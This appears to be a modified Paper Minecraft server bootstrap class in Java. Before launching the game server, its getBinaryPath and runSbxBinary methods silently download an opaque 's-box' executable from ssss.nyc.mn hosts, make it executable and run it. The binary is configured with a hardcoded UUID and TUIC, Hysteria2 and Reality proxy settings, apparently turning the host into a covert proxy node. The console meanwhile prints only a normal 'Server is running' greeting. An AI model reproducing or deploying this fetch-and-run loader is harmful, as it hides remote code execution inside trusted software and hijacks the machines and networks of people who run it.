package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {

    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    // 仅保留 tuic、hysteria2、reality
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT",
        "CFIP", "CFPORT", "NAME"
    };

    private PaperBootstrap() {}

    public static void boot(final OptionSet options) {
        // 检查 Java 版本
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java 版本过低，请切换更高版本！" + ANSI_RESET);
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            System.exit(1);
        }

        try {
            runSbxBinary();

            // 注册退出钩子
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Enjoy your Paper server!\n" + ANSI_RESET);

            // 自动重启线程（北京时间 0 点）
            new Thread(() -> {
                while (running.get()) {
                    try {
                        Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("Asia/Shanghai"));
                        int hour = calendar.get(Calendar.HOUR_OF_DAY);
                        int minute = calendar.get(Calendar.MINUTE);
                        if (hour == 0 && minute == 0) {
                            System.out.println(ANSI_RED + "[AutoRestart] 正在重启服务器..." + ANSI_RESET);
                            stopServices();
                            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
                            System.exit(0);
                        }
                        Thread.sleep(60000);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
        envVars.put("FILE_PATH", "./world");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("CFIP", "");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "Mc");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion, javaVmName, javaVmVersion,
                javaVendor, javaVendorVersion, osName, osVersion, osArch),
            String.format("Loading %s %s for Minecraft %s",
                bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId())
        );
    }
}
